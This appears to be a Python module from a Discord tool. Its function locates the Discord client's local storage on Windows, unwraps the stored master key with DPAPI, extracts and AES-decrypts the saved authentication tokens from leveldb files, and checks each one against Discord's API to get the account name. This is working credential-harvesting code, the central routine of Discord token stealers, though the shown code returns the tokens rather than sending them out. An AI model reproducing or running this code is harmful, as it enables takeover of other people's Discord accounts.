from src import *
from src.plugins.sess import *
from src.plugins.log import *

def gettoken():
    def decrypt(buff, master_key):
        try:
            return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
        except:
            return None

    def getusername(token):
        headers, sess, cookies = getsess(token)
        while True:
            r = sess.get(
                'https://discord.com/api/v9/users/@me',
                headers=headers,
                cookies=cookies
            )

            dlog(r.status_code, r.text)

            if r.status_code == 200:
                return r.json().get('username', 'Unknown')
            
            elif r.status_code == 429:
                limit = float(r.json().get('retry_after', 0))
                log(F.YELLOW, F.YELLOW, f'Rate Limited (Waiting {limit}s)')
                time.sleep(limit)
                continue

            else:
                return 'Unknown or invalid'

    tokens = []
    clean = []
    fulltkns = []
    roaming = os.getenv('APPDATA')
    path = roaming + '\\discord'

    if not os.path.exists(path):
        return []

    try:
        with open(path + f'\\Local State', 'r') as file:
            key = json.loads(file.read())['os_crypt']['encrypted_key']
            file.close()
            
    except: 
        return []

    for file in os.listdir(path + f'\\Local Storage\\leveldb\\'):
        if not file.endswith('.ldb') and not file.endswith('.log'): 
            continue

        try:
            with open(f'{path}\\Local Storage\\leveldb\\{file}', 'r', errors='ignore') as f:
                for _ in f.readlines():
                    _.strip()
                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", _):
                        tokens.append(values)

        except PermissionError: 
            continue

    for _ in tokens:
        if _.endswith('\\'):
            _.replace('\\', '')
        elif _ not in clean:
            clean.append(_)
    
    for token in clean:
        try:
            token_ = decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), base64.b64decode(key)[5:])
            if token_:
                fulltkns.append((token_, getusername(token_)))

        except IndexError: 
            continue

    return fulltkns